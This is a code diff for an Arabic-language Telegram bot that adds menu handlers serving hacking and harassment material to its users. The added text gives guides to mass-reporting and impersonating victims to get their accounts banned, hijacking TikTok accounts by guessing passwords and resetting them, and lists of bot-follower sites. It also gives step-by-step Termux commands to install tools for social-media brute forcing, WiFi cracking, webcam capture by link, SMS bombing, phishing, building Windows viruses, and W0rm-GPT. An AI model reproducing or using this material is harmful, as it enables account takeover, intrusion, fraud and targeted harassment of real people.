@@ -63,6 +63,8 @@ main_menu_keyboard = [
     [InlineKeyboardButton("توليد بوت تلي جاهز AI 🤖", callback_data='generate_bot')],
     [InlineKeyboardButton("ترجمة إلى العربية 🌍", callback_data='translate_text'), InlineKeyboardButton("تنزيل فيديوهات تيك توك 🎥", callback_data='download_tiktok')],
     [InlineKeyboardButton("اسم رباعي 🏷️", callback_data='generate_name')],
+    [InlineKeyboardButton("رشق تيك و انستا 📈", callback_data='social_boost'), InlineKeyboardButton("ثغرات تيك و انستا 🕳️", callback_data='social_vulnerabilities')],
+    [InlineKeyboardButton("ادوات تيرمكس سريه 🖥️", callback_data='termux_tools'), InlineKeyboardButton("ثغرات و بوتات و ادوات تلي 🤖", callback_data='telegram_tools')],
 ]
 main_menu_reply_markup = InlineKeyboardMarkup(main_menu_keyboard)
 
@@ -91,11 +93,8 @@ async def generate_name(update: Update, context) -> None:
     query = update.callback_query
     await query.answer()
     
-    # توليد 3 حروف عشوائية
     letters = ''.join(random.choices(string.ascii_uppercase, k=3))
-    # حرف رابع عشوائي
     last_letter = random.choice(string.ascii_uppercase)
-    # الاسم النهائي
     name = f"{letters}_{last_letter}"
     
     await query.edit_message_text(
@@ -124,21 +123,17 @@ async def download_tiktok(update: Update, context) -> None:
     )
 
 async def handle_tiktok_download(update: Update, context) -> None:
-    """Download TikTok video without watermark - فقط للروابط"""
+    """Download TikTok video without watermark"""
     url = update.message.text.strip()
     
-    # TikTok URL patterns
     tiktok_pattern = r'https?://(?:www\.|vm\.|vt\.)?tiktok\.com/[^\s]+'
     
-    # التحقق: إذا كان النص لا يحتوي على رابط تيك توك، لا تفعل شيء
     if not re.search(tiktok_pattern, url):
-        return  # تجاهل الرسالة بدون رد
+        return
     
     try:
-        # إرسال رسالة "جاري المعالجة"
         processing_msg = await update.message.reply_text("⏳ جاري تحميل الفيديو...")
         
-        # استخدام API تيك توك
         response = requests.post(
             "https://tikwm.com/api/",
             data={"url": url},
@@ -158,13 +153,11 @@ async def handle_tiktok_download(update: Update, context) -> None:
         if "data" not in data or not data["data"]:
             await processing_msg.delete()
             await update.message.reply_text(
-                "❌ عذراً، تعذر تحميل الفيديو. تأكد من الرابط وحاول مرة أخرى.\n\n"
-                "💡 تأكد أن الرابط صحيح ومتاح للعموم.",
+                "❌ عذراً، تعذر تحميل الفيديو. تأكد من الرابط وحاول مرة أخرى.",
                 reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
             )
             return
         
-        # الحصول على رابط الفيديو (بدون علامة مائية)
         video_data = data.get("data", {})
         video_url = video_data.get("hdplay") or video_data.get("play")
         
@@ -176,21 +169,15 @@ async def handle_tiktok_download(update: Update, context) -> None:
             )
             return
         
-        # معلومات إضافية عن الفيديو
         title = video_data.get("title", "فيديو تيك توك")
         author = video_data.get("author", {}).get("unique_id", "مستخدم غير معروف")
         duration = video_data.get("duration", "غير معروف")
         
         await processing_msg.delete()
         
-        # إرسال الفيديو للمستخدم
         await update.message.reply_video(
             video=video_url,
-            caption=f"🎬 **فيديو تيك توك**\n\n"
-                   f"📌 {title[:100]}\n"
-                   f"👤 @{author}\n"
-                   f"⏱️ المدة: {duration} ثانية\n\n"
-                   f"✅ تم التحميل بدون علامة مائية",
+            caption=f"🎬 **فيديو تيك توك**\n\n📌 {title[:100]}\n👤 @{author}\n⏱️ المدة: {duration} ثانية\n\n✅ تم التحميل بدون علامة مائية",
             parse_mode='Markdown',
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("🔄 تنزيل فيديو آخر", callback_data='download_tiktok')],
@@ -202,12 +189,6 @@ async def handle_tiktok_download(update: Update, context) -> None:
         await processing_msg.delete()
         await update.message.reply_text(
             "⏰ انتهى وقت الانتظار. الخادم بطيء، حاول مرة أخرى.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
-        )
-    except requests.exceptions.RequestException as e:
-        await processing_msg.delete()
-        await update.message.reply_text(
-            f"❌ حدث خطأ أثناء التحميل: {str(e)[:100]}",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
         )
     except Exception as e:
@@ -302,6 +283,905 @@ async def get_translation(update: Update, context) -> int:
         )
     
     return CHOOSING_MAIN_MENU
+
+# ======================== الأزرار الجديدة ========================
+
+async def social_boost(update: Update, context) -> None:
+    """روابط رشق تيك و انستا"""
+    query = update.callback_query
+    await query.answer()
+    
+    text = """
+الموقع الاول::
+
+ https://zefoy.com/
+
+الموقع الثاني::
+
+https://froyz.com/
+
+https://zyadat.com/
+https://followadd.com
+smmcpan.com
+seoclevers.com
+followergi.com
+seorrs.com
+https://drd3m.com
+
+https://igtools.me/live
+
+رابط رشق قنوات تلي 
+https://en.mrpopular.net/get-free-telegram-subscribers.php
+
+https://igtor.com/Story
+
+روابط رشق تيك توك 👇🏻.. 
+https://zefoy.com
+
+https://tikfollowers.com/tiktok-free-followers
+------------------------------------------------------
+
+e_lx:
+روابط رشق انستا
+
+
+روابط رشق انستا 👇🏻
+https://igtools.ooo/
+https://igtor.com/
+https://igpro.me/
+https://igsub.me/
+https://sifresiz.instahile.co/story-views
+https://freer.in/?r=home
+-----------------------------------------------------
+ 👇🏻رابط يرشق انستا 150  متابع 
+https://i.anindabegeni.com/
+
+Igtools.ooo
+424. 
+425. Instagramyl.weebly.com
+426. 
+427. https://www.instaore.com/tools
+428. 
+429. http://takipciyurdu.com/tags/takipci-gonder
+430. 
+431. https://instagramtakiphilesi.com/
+432. 
+433. https://instagram.sosyalmedya.store/takipci/
+434. 
+435. https://takipmerkezi.com.tr/
+436. 
+437. https://takipcihilecin.com/tools
+438. 
+439. https://takipci.instager.net/
+440. 
+441. https://takipcipanelim.com/
+442. 
+443. https://www.popileriz.com/tools
+444. 
+445. https://www.instaloji.com/
+446. 
+447. https://takipci.instager.net/blog/instagram-sifresiz-takipci-hilesi
+448. 
+449. https://takipcisitelerin.com/
+450. 
+451. http://instagrambegenin.com/tools
+452. 
+453. https://www.instafenomeni.net/tools
+454. 
+455. http://instabayim.com/
+456. 
+457. https://www.insfollow.com/tags/instagram-takipci-gonder
+458. 
+459. https://takipapp.com/
+460. 
+461. https://sosyalmedyakazan.com/
+462. 
+463. https://www.instaore.com/tools
+464. 
+465. http://takipciyurdu.com/tags/takipci-gonder
+466. 
+467. https://www.takipcipanelim.com/tools
+468. 
+469. https://maxtakipci.com/tools
+470. 
+471. http://instagrambegenin.com/
+472. 
+473. https://www.instaloji.com/tools
+474. 
+475. https://www.instatakipcibegeni.net/tools
+476. 
+477. https://takipcicenter.com/tools
+478. 
+479. http://hepinsta.com/
+480. 
+481. https://instagram.takipcisitelerin.com/
+482. 
+483. https://www.takipcibegenigonder.com/
+484. 
+485. https://mediainsta.com/
+486. 
+487. https://www.silvertakipci.com/
+488. 
+489. https://insfollow.com/tools
+490. 
+491. http://www.seononline.com/tools
+492. 
+493. https://instatakipmerkezi.com/
+494. 
+495. https://takipmerkezi.com.tr/blog/instagram-takipci-gonder-firsatlari
+496. 
+497. https://www.mediainsta.com/tools
+498. 
+499. https://takipcilerbizden.com/tools
+
+500. 
+501. https://4takip.com/
+502. 
+503. https://begendiler.com/
+504. 
+505. https://silvertakip.net/tools
+506. 
+507. https://www.xtakipci.net/
+508. 
+509. https://takipsi.com/
+510. 
+511. https://vipinstagramtakipci.com/
+512. 
+513. https://ibegenapp.com/
+514. 
+515. http://igtakip.win/
+516. 
+517. https://instagram.begenin.net/
+518. 
+519. https://takipcisepeti.com/tools
+520. 
+521. https://www.silvertakipci.com/
+522. 
+523. https://insfollow.com/tools
+524. 
+525. https://silverbegeni.com/
+526. 
+527. https://instagramhilecim.com/tools
+528. 
+529. https://www.begensinler.com/
+530. 
+531. https://takipcistar.com/tools
+532. 
+533. http://silvertakip.com/
+534. 
+535. https://vipinstagramtakipci.com/tools
+536. 
+537. https://takipci1.com/tools
+538. 
+539. https://www.takipcipro.com/tools
+540. 
+541. https://instagramtakiphilesi.com/instagram-begeni-paneli/index.html
+54
+
+2. 
+543. http://takipciyurdu.com/
+544. 
+545. https://begendiler.com/
+546. 
+547. https://www.instafenomeni.net/
+548. 
+549. https://instakipci.pro/
+550. 
+551. https://insmobil.com/
+552. 
+553. https://ibegenapp.com/tools
+554. 
+555. https://v3sc.tk/Instagram-Sifresiz-Takipci
+556. 
+557. https://instahilesiapp.com/tools
+558. 
+559. http://trendsosyal.com/instagram.php
+560. 
+561. https://takipciaraci.com/tools
+562. 
+563. https://i.sosyaltechs.com/tools
+564. 
+565. https://www.seononline.com/
+566. 
+567. https://tektakipci.com/tools
+568. 
+569. http://www.enginuzun.org/baskasina-takipci-gonderme-baska-hesaba-begeni-gonder.html
+570. 
+571. https://www.takipsosyal.com/
+572. 
+573. http://www.hepinsta.com/tools/send-follower
+574. 
+575. https://instagram.takipcisatinal.com.tr/tag/instagram-takipci-gonder/
+576. 
+577. http://begenipaneli.net/tools
+578. 
+579. https://silverbegeni.com/tools
+580. 
+581. https://sosyalmedyakazan.com/tools
+582. 
+583. https://instagramtakiphilesi.com/instagram-begeni-paneli/index.html
+584. 
+585. http://takipciyurdu.com/
+586. 
+587. https://www.youtube.com/watch?v=10tqMjwDTNE
+588. 
+589. https://instavevo.com/tools
+590. 
+591. https://iyitakipci.com/tools
+592. 
+593. https://www.instagramozel.com/
+
+👇🏻رابط يرشق انستا 150  متابع 
+https://i.anindabegeni.com/
+"""
+    
+    await query.edit_message_text(
+        text,
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
+    )
+
+async def social_vulnerabilities(update: Update, context) -> None:
+    """ثغرات تيك و انستا"""
+    query = update.callback_query
+    await query.answer()
+    
+    text = """
+روح لحساب الي تريد تبنده وبلغ على كل تعاليقه خطاب كراهيه وراهه روح على الفيدوات تشد عليهم كلهم تحرش او تنمر-شخص اعرفه /بعدين روح شد على الحساب وره ما يبلع انتهاك شد 10 مزعج و10 تحرش او تنمر شخص اعرفه (على الحساب
+
+طريقه ثانيه 
+
+اول خطوه تروح الحساب ضحيه
+تبلغ ع كل الفيديوهات تنطي خطاب كراهي وبعدهه تروح تنطي ابلاغ ع حساب وتنطي آخر وتلصق هاذا الكود 
+
+ дравствуйте, компания tik, пожалуйста, забаньте мне этот аккаунт, потому что он публикует ложные новости, а их подлинность не была доказана.
+
+ثغره حذف حساب ( تيك توك )
+
+( i,m 7 ) لنسخ الكود
+
+طريقة استخدام 
+
+*تقنع الضحيه عود هو كود لرشق
+*قنعه يحطه بل نبذة (بايو) 
+*خلال 3 ثواني ينحذف
+
+صيد فرنسي موثق🙄
+
+اول شي افتح vpn ع فرنسا وبحث موثق اخر فديو لة 2018 بعدين خش علية وحط اباس زي يوزر😳🇫🇷 اهم شي انتبه لا يكون في تحقق 🤔🌿
+
+ذي برايفت
+
+
+ثغرة الموثق
+
+اول شي تبحث بالبحث حق قوقل عن famous Indian names او popular Indian names و تاخذ من هناك اسم و تروح بحث التيك تحط الاسم تدور في الحسابات مثلا لقيت يوزر كذا soldos52 تاخذه و تروح تسجيل دخول و تحط الباس هو اليوزر اذا ما ضبط مرات يكون الاسم الي فوق Soldos بدون الارقام و مرات مع الارقام برضو تجرب الباس و الثغره يحتاج لها صمله
+
+ثغره المزغرف
+تروح البحث تكتب كتابه مزغرف
+تشوف يوزر تقدر تخمن الباس بس نسبت 30% ما يضبط
+تشوف الاسم الفوق إذا أكثر من 6احرف تنسخه إذا مسوين عليه حساب جيميل تروح تسوي حساب إذا ضبط تروح تسوي نسيت كلمت السر بعده تحط كلمت السر الجديده ومبروك
+
+
+
+ثغره رباعي تيك توك
+
+تروح للبحث
+
+تكتب اي رباعي
+
+كون مصفر متابعين ومابي صوره
+
+تروح تكتب بل كوكل باسوردات مشهورة
+
+وتجرب علية
+
+وراح يضبط %100
+
+اذا ما ضبط جرب غيرة
+
+안녕하세요 틱톡은 모든 방송법과 회사법을 위반하고, 마약과 폭력적이고 폭력적인 발언을 조장하고 살인과 폭력을 선동하는 테러리스트의 방송을 모욕하는 방법을 팔로워들에게 가르치는 분입니다. 방송을 삭제 해주세요. 감사합니다
+
+
+طيرو فيه البثوث المخالفه فقط ♥️
+
+ثغرة سحب حسابات عالية
+تكتب iraq بل عراق لو tty
+
+
+تبحث حسابات عالية
+
+يكون اليوزر هيج kdksowoeoie38
+
+والاسم نفس يوزر
+
+تذهب الا نسيت كلمه سر
+
+اذا الايميل طلع متسجل
+
+تذهب للجميل تسوي ايميل بي وتسحبة
+"""
+    
+    await query.edit_message_text(
+        text,
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
+    )
+
+async def termux_tools(update: Update, context) -> None:
+    """ادوات تيرمكس سريه"""
+    query = update.callback_query
+    await query.answer()
+    
+    text = """
+باستخدام هذه الأداة، يمكنك فرض هجوم عنيف على فيس بك Facebook، وتثبيت أداة اختراق واي فاي Wifi وتثبيت أدوات إعداد تريمكس  ويمكنك تثبيت سمة Tarmux في جهازك بسهولة وبدون اي مشاكل 
+
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑 
+----------------------------
+
+apt update && apt upgrade -y
+
+pkg install git
+
+pkg install python
+
+rm -rf ALL-IN-ONE
+
+git clone --depth=1 https://github.com/U7P4L-IN/ALL-IN-ONE.git
+
+cd ALL-IN-ONE
+
+python3 ALL.py
+
+اداة فحص المواقع للعثور على ثغرة اكس اس اس Xss
+هاذي الاداه مصممه للعثور عن المواقع المصابه بهاذي الثغره
+طرريقة التشغيل على تطبيق تريمكس 
+
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
+----------------------------
+
+$ git clone https://github.com/Emoe/kxss
+
+$ cd kxss 
+
+$ apt install golong -y 
+
+#go build main.go 
+
+$ mv main /bin/xss
+
+$ apt install getallurls
+
+هاذي الاداه يمكنك عبرها اختراق فيس وجيميل وانستغرام وتويتر فقط جيد استخدامها وتشتغل بدون اي مشاكل شغال على تطبيق تريمكس 
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
+----------------------------
+
+$ pkg update && pkg upgrade -y
+
+$ apt-get install git
+
+$ git clone https://github.com/TunisianEagles/SocialBox.git
+
+$ cd SocialBox
+
+$ chmod +x SocialBox.sh
+
+$ chmod +x install-sb.sh
+
+$ bash install-sb.sh 
+
+$ bash SocialBox.sh
+
+e_lx:
+| 10 ادوات في اداة واحدة |
+
+
+أدوات الكل في واحد [أفضل 10 أدوات اختراق]🔰
+
+الكل في واحد [10 أدوات] يمكن أن يعمل على أجهزة مختلفة لأنه برنامج متعدد الأغراض. باستخدام هذه الأداة، يمكنك فرض هجوم عنيف على فيسبوك، وتثبيت أداة اختراق Wifi، وتثبيت أدوات إعداد Tarmux، ويمكنك تثبيت سمة Tarmux في جهازك بسهولة فقط عبر تريمكس 
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
+----------------------------
+
+apt update && apt upgrade -y
+
+pkg install git
+
+pkg install python
+
+rm -rf ALL-IN-ONE
+
+git clone --depth=1 https://github.com/U7P4L-IN/ALL-IN-ONE.git
+
+cd ALL-IN-ONE
+
+python3 ALL.py
+
+أداة لجمع معلومات الضحية عبر بروتوكول الإنترنت مع ميزة إظهار رقم الهاتف التثبيت على  تريمكس 
+
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
+------------------------------------
+
+$- apt update
+
+$- pkg install python3
+
+$- pkg install python
+
+$- pip install requests
+
+$- pip install render
+
+$- pip install time
+
+$- pip install bs4
+
+$- pip install uuid
+
+$- pip install random
+
+$- pkg install git
+
+$- git clone https://github.com/AlmunharifHamoudi/ip.git
+
+$- cd ip
+
+$- python ip.py
+
+⌯ اداة اختراق شبكات الوايفاي عبر  تريمكس 
+
+• مميزات الاداه كتالي 
+1) بدء وضع المراقبة
+2) إيقاف وضع المراقبة
+3) فحص الشبكات
+4) الحصول على مصافحة (Handshake)
+5) إنشاء قائمة كلمات مرور
+6) تثبيت أدوات الشبكات اللاسلكية
+7) هجمات على شبكات WPS
+8) فحص شبكات WPS
+9) كسر المصافحة باستخدام rockyou.txt
+10) كسر المصافحة باستخدام قائمة كلمات المرور
+11) كسر المصافحة بدون قائمة كلمات المرور
+
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
+------------------------------------
+
+$- apt update 
+ 
+$- apt install git 
+
+$- apt install python
+
+$- apt install python3
+ 
+$- apt install cmatrix
+
+$- rm -rf WIFI-HACKING
+
+$- git clone --depth=1 https://github.com/U7P4L-IN/WIFI-HACKING.git
+
+$- cd WIFI-HACKING
+
+$- ls
+
+$- python WIFI.py
+
+عبر هاذي الاداه يمكنك عمل فيزات مشحونه عبر تريمكس 
+
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
+------------------------------------
+
+1- apt update 
+
+2- apt upgrade 
+
+3- apt install git 
+
+4- git clone https://github.com/INDOnimous/Card-Number
+
+5- ls
+
+6- cd Card-Number
+
+7- ls 
+
+8- chmod +x *
+
+9- ls
+
+10- sh Card.sh
+
+عبر هاذي الاداه يمكنها ان ترسل كمية هائلة من الرسائل النصية القصيرة والمكالمات إلى هدف واحد
+
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
+----------------------------
+
+pkg update
+
+pkg install python3 python3-pip git -y
+
+git clone https://github.com/LimerBoy/Impulse
+
+cd Impulse/
+
+pip3 install -r requirements.txt
+
+python3 impulse.py --help
+
+هاذي الاداه لتتبع شخص ما التشغيل على  تريمكس 
+
+التعليمات 👇
+IP Tracker : لتتبع عنوان IP الخاص بشخص ما
+إظهار IP الخاص بك : لرؤية عنوان IP الخاص بك
+تعقب الهاتف : لتتبع رقم هاتف شخص ما
+تعقب اسم المستخدم : لتتبع الأشخاص بالاسم
+خروج : للخروج من الأدوات
+
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
+----------------------------
+$ apt update
+
+$ apt upgrade
+
+$ pkg install git
+
+$ pkg install python
+
+$ pkg install python3
+
+$ git clone https://github.com/Whomrx666/Xtracking.git
+
+$ cd Xtracking
+ 
+$ pip install -r requirements.txt
+
+$ python3 Xtracking.py
+
+200 اداه بداخل اداه واحده 
+هاذي الأدوات مهمه جداً ب القرصنه والتلاعب والكثير من الاشياء الذي قد تجدها بداخلها 
+
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑 
+------------------------------------
+
+$ apt update && apt upgrade -y
+
+$ apt install git
+
+$ apt install php
+
+$ apt install curl
+
+$ apt install ruby
+
+$ apt install figlet
+
+$ apt install python2
+
+$ gem install lolcat
+
+$ git clone https://github.com/TUANB4DUT/TOOLSINSTALLERv3
+
+$ cd TOOLSINSTALLERv3
+
+$ chmod +x TUANB4DUT.sh
+
+$ sh TUANB4DUT.sh
+
+
+----------------   ------------------
+
+اداه اختراق كاميرا الضحيه + تسجيل صوت للضحيه عن طريق لينك
+
+$- apt-get update -y
+
+$- apt-get upgrade -y
+
+$- pkg install git -y
+
+$- pip install lolcat
+
+$- git clone https://github.com/Expert-Hacker/E-TOOL.git
+
+$- cd E-TOOL
+
+$- bash setup.sh
+
+• بعد انتهاء التثبيت لو عايز تخترق الكاميرا هتكتب الاوامر التالية
+$- ls
+
+$- cd voice
+
+$- bash camera.sh
+
+• هتسيبو يحمل بعدها هتختار السرفر اختار ال انت عيزو 1 او 2 لو طلب منك (Y/N) اختار Y بعدها هتكتب الرقم ال هيكون موجود قودامك ال هيطلبو بعدها تسيبو يحمل هيديك لينك ابعتو للضحيه وخليه يديلو الاذونات وبس كده
+
+• لو عايز تسجل صوت للضحيه اكتب الاوامر التاليه
+
+• لو لسه ف مجلد camera اكتب 
+
+$- cd ..
+
+• الامر ال فوق ده للرجوع لو انت لسه مش فاهم 
+
+$- cd voice
+
+$- bash voice.sh
+
+• وهتنفذ نفس ال فوق عادي وبس كده.
+
+ادوات اختراق انستا تريمكس 
+
+pkg install python2
+
+pkg install python
+
+pkg install git
+
+pkg install python2 git -y
+
+pip2 install requests
+
+pip2 install bs4
+
+git clone https://github.com/TERMUXID3/instabrute
+
+cd instabrute
+
+chmod +x *
+
+python2 instabrute.py
+
+أداة تريمكس  لاستخراج أرقام هنديه عشوائيه 
+
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
+------------------------------------
+
+$  apt update
+
+$  apt install git
+
+$ apt install python
+
+$ apt install python3
+
+$  git clone https://github.com/BlackFoxTM/tracenum
+
+$  cd tracenum
+
+$  pip3 install -r requirements.txt
+
+$  python3 main.py
+
+أداة القرصنة الألبانيه!! أدوات لمساعدتك في القرصنه الأخلاقيه، واختراق وسائل التواصل الاجتماعي، ومعلومات الهاتف، وهجوم Gmail، والهجوم على رقم الهاتف، واكتشاف المستخدم، والرسائل القصيره المجهوله واختراق كاميرا الويب • أداه قويه لهجوم DDOS!! فقط على تريمكس
+
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
+------------------------------------
+
+
+pkg install git
+
+git clone https://github.com/4lbH4cker/ALHacking
+
+cd ALHacking
+
+bash alhack.sh
+
+تُستخدم هذه الأداة المسماة W0rm-GPT بشكل أساسي للبحث في جميع الأنشطة التي لا يمكن لـ ChatGPT تقديمها، وجميع واجهات برمجة التطبيقات العاملة موجودة في البرنامج النصي فقط كمساعده وذكاء اصطناعي على تطبيق  تريمكس 
+
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
+------------------------------------
+
+pkg up -y
+
+pkg install git wget python -y
+
+git clone https://github.com/samay825/W0rm-Gpt
+
+cd W0rm-Gpt
+
+pip install -r requirements.txt
+
+python3 main.py
+
+اختراق الكاميرا اداة HACK-CAMERA، أداة جديدة لالتقاط الصور. على عكس الآخرين الذين يستخدمون servero وngrok، فإن HACK-CAMERA يجعل الأمور أسهل. يستخدم الكثير من الأشخاص ngrok، لكن لا يعرف الجميع السيرفيو جيدًا. عندما تقوم بمشاركة رابط ngrok، فإنه يظهر تحذيرًا، مما يجعله واضحًا. ولكن مع خيار الارتباط السحابي الخاص بـ HACK-CAMERA، لا توجد تحذيرات. لذلك، استخدم الأداة بحرية دون القلق بشأن التنبيهات، تمامًا مثل الأدوات الأخرى. التثبيت على  تريمكس 
+
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
+------------------------------------
+apt update && apt upgrade -y
+
+apt install git -y
+
+apt install curl -y
+
+apt install wget -y
+
+git clone https://github.com/XPH4N70M/HACK-CAMERA.git
+
+cd HACK-CAMERA
+
+bash setup
+
+bash hack_camera.sh
+
+أداة تصيد تلقائية وسهلة الاستخدام للمبتدئين تحتوي على أكثر من 30 نموذجًا. تستخدم على  تريمكس
+
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
+----------------------------
+
+$ cd Xphisher
+
+$ chmod 777 Xphisher.sh
+
+$ bash Xphisher.sh
+
+$ git clone https://github.com/Whomrx666/Xphisher.git
+
+اوامر اداه AMF1لعمل تلغيم صوره لسحب الip :
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
+----------------------------
+
+1- pkg install python
+
+2- pkg install git
+
+3- git clone https://github.com/abdalkreemafm/AMF1
+
+4- ls
+
+5- cd AMF1
+
+6- chmod +x AMF1.py
+
+7- python AMF1.py
+
+بعد كذا تكتب رقم 1 وتدوس انتر
+
+منشئ الفيروسات. هي أداة من محطة termux.
+ستقوم هذه الأداة بإنشاء فيروس يمكنه فقط تدمير جهاز الكمبيوتر الذي يعمل بنظام Windows. يمكنك أيضًا تكوين التشغيل التلقائي في محرك أقراص USB
+
+التثبيت على تطبيق  
+#اليك_الاوامر_با_الترتيب_انسخ_الاوامر امر تلو الاخر ولصقه في تطبيق تريمكس يحسن استخدام الاداه لكي تعمل معك 🛑
+----------------------------
+
+git clone https://github.com/Cyber-Dioxide/Virus-Builder/
+
+cd Virus-Builder
+
+pip install -r requirements.txt
+
+python3 Builder.py
+
+apt update -y 
+
+2-$ apt upgrade -y
+
+وبعدها اختار الحرف y
+
+3-$ termux-setup-storage 
+
+وبعدها
+
+4-$ ls 
+
+5-$ cd storage 
+
+وبعدها 
+
+6-$ ls
+
+وبعدها الأمر الاخير للخروج من التطبيق 
+
+7-$ exit
+"""
+    
+    await query.edit_message_text(
+        text,
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("العودة للقائمة الرئيسية 🔙", callback_data='main_menu')]])
+    )
+
+async def telegram_tools(update: Update, context) -> None:
+    """ثغرات و بوتات و ادوات تلي"""
+    query = update.callback_query
+    await query.answer()
+    
+    text = """
+بريدات الشركه
+stopCA@telegram.org, abuse@telegram.org, Support_Team@telegram.org
+
+الموضوع 
+Illegal image +18
+
+
+الرساله الاكترونيه 
+This robot hurts the Telegram community as it spreads porn 
+link bot:     رابط البوت هنا
+
+- طريقة فك حظر حسابك المحضور من المراسله في الخاص:
+
+-اولاً : تدخل الى هذا البوت التالي :
+ @spambot 
+- ترسل start.
+ثانياً  : ارسل هذا خطاء.
+ثالثاً  : اضغط نعم.
+رابعاً : اضغط لا لم اقم بهذا قط !
+انتظر قليلاً سيقوم بالرد عليك : ماذا حدث؟  
+خامساَ : تُرسل هذا الكود اليه  .
+
+- لقد تم الأبلاغ عن حسابي بسبب كراهية بعض الناس لي ، لم اقم بمراسله احدهم ، يقومون بلأبلاغ عني بدون ادنى سبب .
+
+- تنتظر نصف ساعه ثم تدخل علا البوت وترسل :   
+/start 
+- سوف يقوم بالرد عليك بـإنه قد تم فك الحظر عن حسابك.
+
+- انتحال شخصيه.
+
+تقوم بـ انتحال شخصيه الضحيه والابلاغ عنه  ،  تقوم بتعيين حسابك تفس حساب الضحيه بـ الخلفيه والنبذه وحتى اسم المستخدم ،  مثلا لو كان اسم المستخدم حق الضحيه هكذا  :  
+@mohammed771
+
+تقوم بنسخه وتغيير بسيط تسوي فيه بتغيير حرف او زياده حرف من وسط المعرف هكذا  :
+@mohaamed771
+كي تستطيع تسويته معرف لك. 
+
+ثم تذهب الى بوت الابلاغ عن انتحال الخاص بالشركه. :
+@notoscam
+
+تقوم بمراسله الشركه بهذه الرساله  :
+
+Hello I would like to inform you of a problem that happened to me. Someone has impersonated me.  I woud like you to close his account I will attach his information to you .
+
+ثم ترسل لهم معلومات عن منتحل شخصيتك  هكذا
+
+Name : الاسم
+User name :معرف الضحيه
+Overview :  النبذه 
+
+وتسوي لقطه شاشه لحساب الضحيه وتقوم بإرساله الى البوت مع الصيغ.
+
+وتنتظر لحين تقوم شركه تليجرام بحظره   .
+
+تنويه لا تقوم بتعديل حسابك الى ان يتم حظر الضحيه.
+
+
+  ≈≈≈≈ ≈≈≈≈ ≈≈≈≈ ≈≈≈≈ ≈≈≈≈ ≈≈≈≈ ≈≈≈≈ ≈≈≈
+
+رابط المراسلة
+abuse@telegram.org
+الموضوع
+
+The channel publishes violent content
+
+الرسالة الاكترونية
+This channel published porn pictures and pictures of girls and delegations of pornographic +18 and publish pictures of families and expose and intimidate women in exchange for material amounts I hope from the company Telegram and cadre respect to shut the channel at a time and thank you very much
+Link:القناة
+ورح يردو عليك باقرب وقت بس بلغ على القناة شوي
+
+Support_Team@telegram.org
+
+abuse@telegram.org
+
+stopCA@telegram.org
+
+ 
+
+كود حظر قنوات تليجرام
+
+
+
+كود تطير قنوات تلجرام تعمله في ابلاغ وترسله 
+30 مره لقنوات الاباحي 
+
+الكود. 👇
+
+ハッカー世界と架空の世界を作るには、私たちはHRB🔞鳥の攻撃チャンネル電報ではありませんイラクの国に爆弾が表示されま日本クラウンと私たちの国は中国の誇り、世界の王たちは、私たちは私たちの手の中に悪い将来されているを立つ人すべてを破壊する私たちは、将来の王たち、私の兄弟、私のp tのbのkのH B Rレッツありますハッカー世界と架空の世界を作る ** ☜ هنا تحط معرف القناه
+
+كود مضمون 100%
+"""
+    
+    await query.edit_message_text(
+        text,
+        parse_mode='Markdown',
